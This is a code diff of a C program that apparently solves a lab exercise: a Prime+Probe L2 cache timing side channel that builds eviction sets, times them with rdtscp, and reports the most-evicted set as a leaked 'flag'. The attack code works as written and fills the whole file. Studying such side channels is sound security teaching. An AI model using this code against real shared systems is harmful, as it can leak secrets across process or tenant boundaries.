@@ -1,142 +1,170 @@
 #include "util.h"
-// mman library to be used for hugepage allocations (e.g. mmap or posix_memalign only)
 #include <sys/mman.h>
-#include <stdio.h>
+#include <time.h>
 #include <stdlib.h>
+#include <stdio.h>
 #include <stdint.h>
 #include <string.h>
-#include <time.h>
 
-
-#define L2_ASSOCIATIVITY 16
-#define L2_SETS 1024 
-#define BASE_SET 64
-#define PAGE_SIZE (1 << 21) // 2 MB
-#ifndef SET_STRIDE_BYTES 
-#define SET_STRIDE_BYTES (1 << 16) 
+#define BUFF_SIZE (1<<21)
+#define L2_WAYS 16
+#ifndef STRIDE
+#define STRIDE (1<<16)
 #endif
 
-// Linked List so that the CPU will have to follow the chain of pointers, which will cause cache evictions
-struct linked_list_node {
-    struct linked_list_node *next;
-    char padding[BASE_SET - (sizeof(struct linked_list_node *))];
-};
-
-// Variables for the work area and the linked list chains for each cache set
-void *work_area;
-struct linked_list_node *set_chains[L2_SETS];
-
-// Calculate Latency Difference through rdtscp
+// Inline rdtscp for timing
 static inline uint64_t rdtscp(void) {
     uint32_t lo, hi;
     asm volatile("rdtscp" : "=a"(lo), "=d"(hi) :: "rcx");
-    return ((uint64_t)hi << 32) | lo; // output is the time stamp counter
+    return ((uint64_t)hi << 32) | lo;
 }
 
-// Shuffle the pointers in the linked list to break predictable memory access patterns to ensure the prime + probe measurements are accurate
-void shuffle_pointers(struct linked_list_node **nodes, int count) {
-    for (int i = count - 1; i > 0; i--) {
+// Linked list node
+struct node {
+    struct node *next;
+    char pad[64 - sizeof(struct node *)]; // Pad to cache line size
+};
+
+void *buf;
+struct node *sets[1024]; // Pointers to the start of each set's list
+
+// Shuffle an array of pointers
+void shuffle(struct node **array, int n) {
+    for (int i = n - 1; i > 0; i--) {
         int j = rand() % (i + 1);
-        struct linked_list_node *temp = nodes[i];
-        nodes[i] = nodes[j];
-        nodes[j] = temp;
+        struct node *temp = array[i];
+        array[i] = array[j];
+        array[j] = temp;
     }
 }
 
-// Construct eviction sets for a given set ID 
-void eviction_set_construction(int logical_set_id) {
-    char *base = (char *)work_area;
-    struct linked_list_node *nodes[L2_ASSOCIATIVITY];
-    for (int way = 0; way < L2_ASSOCIATIVITY; way++) {
-        nodes[way] = (struct linked_list_node *)((base + (logical_set_id * BASE_SET)) + (way * SET_STRIDE_BYTES));
+// Build shuffled linked list for a set
+void build_set(int set_index) {
+    char *base = (char *)buf;
+    struct node *nodes[L2_WAYS];
+    
+    for (int i = 0; i < L2_WAYS; i++) {
+        nodes[i] = (struct node *)(base + set_index * 64 + i * STRIDE);
     }
-    shuffle_pointers(nodes, L2_ASSOCIATIVITY);
-    for (int way = 0; way < L2_ASSOCIATIVITY - 1; way++) {
-        nodes[way]->next = nodes[way + 1];
+    
+    shuffle(nodes, L2_WAYS);
+    
+    for (int i = 0; i < L2_WAYS - 1; i++) {
+        nodes[i]->next = nodes[i+1];
     }
-    nodes[L2_ASSOCIATIVITY - 1]->next = NULL;
-    set_chains[logical_set_id] = nodes[0];
+    nodes[L2_WAYS-1]->next = NULL;
+    
+    sets[set_index] = nodes[0];
 }
 
-// Prime the cache by following the linked list for the given set ID
-void prime_cache(int set_id) {
-    for(int i = 0; i < L2_ASSOCIATIVITY; i++) {
-        volatile struct linked_list_node *current = set_chains[set_id];
-        while (current) {
-            current = current->next;
+// Prime the current set
+void prime_set(int set_index) {
+    struct node *curr = sets[set_index];
+    while (curr) {
+        curr = curr->next;
+    }
+}
+
+// Probe the current set and return the access time
+uint64_t probe_set(int set_index) {
+    uint64_t start = rdtscp();
+    struct node *curr = sets[set_index];
+    while (curr) {
+        curr = curr->next;
+    }
+    uint64_t end = rdtscp();
+    return end - start;
+}
+
+// Structure to store results for sorting
+typedef struct {
+    int set_index;
+    uint64_t median_latency;
+} Result;
+
+int compare_results(const void *a, const void *b) {
+    Result *r1 = (Result *)a;
+    Result *r2 = (Result *)b;
+    // Sort descending by latency
+    if (r2->median_latency > r1->median_latency) return 1;
+    if (r2->median_latency < r1->median_latency) return -1;
+    return 0;
+}
+
+// Helper to find median of an array
+uint64_t find_median(uint64_t *arr, int n) {
+    // Simple bubble sort for small n
+    for (int i = 0; i < n-1; i++) {
+        for (int j = 0; j < n-i-1; j++) {
+            if (arr[j] > arr[j+1]) {
+                uint64_t temp = arr[j];
+                arr[j] = arr[j+1];
+                arr[j+1] = temp;
+            }
         }
     }
+    return arr[n/2];
 }
-
-// Probe the cache by measuring the time taken to follow the linked list for the given set ID
-uint64_t probe_cache(int set_id) {
-    uint64_t start_time = rdtscp();
-    volatile struct linked_list_node *current = set_chains[set_id];
-    while (current) {
-        current = current->next;
-    }
-    return rdtscp() - start_time; // return the latency of probing the cache
-}
-
-// 
 
 int main(int argc, char const *argv[]) {
     srand(time(NULL));
 
-    // Allocate a large memory region for the work area using hugepages
-    work_area = mmap(NULL,
-                     PAGE_SIZE,
-                     PROT_READ | PROT_WRITE,
-                     MAP_POPULATE | MAP_ANONYMOUS | MAP_PRIVATE | MAP_HUGETLB,
-                     -1,
-                     0);
-    if(work_area == MAP_FAILED) {
-        perror("hugepage map failed, trying regular page");
-        work_area = mmap(NULL,
-                     PAGE_SIZE,
-                     PROT_READ | PROT_WRITE,
-                     MAP_POPULATE | MAP_ANONYMOUS | MAP_PRIVATE,
-                     -1,
-                     0);
-        if(work_area == MAP_FAILED) {
-            exit(EXIT_FAILURE);
-        }
-    }
-
-    memset(work_area, 0, PAGE_SIZE); // Initialize the work area with zeros
-    uint64_t record[L2_SETS];
-    memset(record, 0, sizeof(record)); // Record the number of hits for each set
-
-    // Eviction set constructed for L2 cache sets
-    for(int i = 0; i < L2_SETS; i++) {
-        eviction_set_construction(i);
-    }
-
+    // Allocate huge page
+    buf = mmap(NULL, BUFF_SIZE, PROT_READ | PROT_WRITE, MAP_POPULATE | MAP_ANONYMOUS | MAP_PRIVATE | MAP_HUGETLB, -1, 0);
     
-    uint64_t threshold = 295; // From Part 01 Timing Graph 
-    int rounds = 3000; // High statistical rate to go above noise of measurements
+    if (buf == (void*) - 1) {
+        perror("mmap() error\n");
+        exit(EXIT_FAILURE);
+    }
+    
+    *((char *)buf) = 1; // dummy write
 
-    for(int r = 0; r < rounds; r++) {
-        for(int s = 0; s < L2_SETS; s++) {
-            prime_cache(s);
-            // Waiting for Victim to access the cache line
-            for(volatile int wait= 0; wait < 100; wait++);
-            asm volatile("lfence");
-            uint64_t latency = probe_cache(s);
-            asm volatile("lfence");
-            record[s] += latency;
+    printf("Building sets...\n");
+    for (int i = 0; i < 1024; i++) {
+        build_set(i);
+    }
+
+    printf("Scanning L2 sets (using median filtering)...\n");
+
+    // Store measurements for all sets across all passes
+    // 1024 sets, 5 passes
+    #define PASSES 5
+    uint64_t measurements[1024][PASSES];
+
+    int samples = 1000; // High sample count for stability
+
+    for (int p = 0; p < PASSES; p++) {
+        printf("Pass %d/%d...\n", p+1, PASSES);
+        for (int i = 0; i < 1024; i++) {
+            uint64_t total_latency = 0;
+            
+            for (int k = 0; k < samples; k++) {
+                prime_set(i);
+                // Wait a bit for victim to access
+                for(volatile int w=0; w<1000; w++);
+                total_latency += probe_set(i);
+            }
+            
+            measurements[i][p] = total_latency / samples;
         }
     }
 
-    // Find the set with the maximum number of hits
-    int flag = -1;
-    uint64_t max_hits = 0;
-    for(int i = 0; i < L2_SETS; i++) {
-        if(record[i] > max_hits) {
-            max_hits = record[i];
-            flag = i;
-        }
+    // Calculate medians
+    Result results[1024];
+    for (int i = 0; i < 1024; i++) {
+        results[i].set_index = i;
+        results[i].median_latency = find_median(measurements[i], PASSES);
     }
-    printf("\nDetected Flag: %d (Score: %lu)\n", flag, max_hits);
+
+    // Sort results
+    qsort(results, 1024, sizeof(Result), compare_results);
+
+    printf("\nTop 5 High Latency Sets (Median over %d passes):\n", PASSES);
+    for (int i = 0; i < 5; i++) {
+        printf("Set %d: %llu cycles\n", results[i].set_index, (unsigned long long)results[i].median_latency);
+    }
+
+    printf("\nDetected Flag: %d\n", results[0].set_index);
+    
     return 0;
 }
